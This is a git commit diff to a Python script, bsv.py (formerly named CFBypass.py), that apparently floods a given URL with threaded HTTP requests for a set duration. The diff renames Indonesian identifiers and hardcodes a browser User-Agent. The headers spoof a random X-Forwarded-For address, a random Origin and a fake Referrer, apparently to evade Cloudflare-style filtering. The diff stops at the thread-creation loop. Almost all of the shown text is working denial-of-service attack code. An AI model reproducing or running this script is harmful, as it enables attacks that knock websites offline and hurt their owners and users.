6625b897185bdd2af04dbf394bd67c422e3e8b82
baimdevelop <baimstore116@gmail.com>
2024-07-01 12:29:43 +0700

    Update bsv.py

--- bsv.py
+++ bsv.py
@@ -3,30 +3,31 @@ import random
 import time
 import threading
 import os
+import sys
 
-def string_acak_panjang(length):
-    karakter = 'abcdefghijklmnopqrstuvwxyz0123456789'
-    return ''.join(random.choice(karakter) for _ in range(length))
+def random_string(length):
+    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
+    return ''.join(random.choice(characters) for _ in range(length))
 
-def ip_acak():
+def random_ip():
     return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
 
 def main(url, waktu):
     if len(sys.argv) <= 2:
-        print("Penggunaan: python CFBypass.py <url> <waktu>")
+        print("Penggunaan: python bsv.py <url> <waktu>")
         sys.exit(-1)
 
     def kirim_pengiriman():
-        header = {
-            'User-Agent': requests.get(url).headers['User-Agent'],
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
             'Upgrade-Insecure-Requests': 1,
-            'cookie': requests.get(url).headers['Set-Cookie'],
-            'Origin': f"http://{string_acak_panjang(10)}.com",
-            'Referrer': f"http://google.com/{string_acak_panjang(10)}",
-            'X-Forwarded-For': ip_acak()
+            'cookie': 'cookie_value',
+            'Origin': f"http://{random_string(10)}.com",
+            'Referrer': f"http://google.com/{random_string(10)}",
+            'X-Forwarded-For': random_ip()
         }
-        requests.get(url, headers=header)
+        requests.get(url, headers=headers)
 
     benangs = []
     for _ in range(int(waktu)):
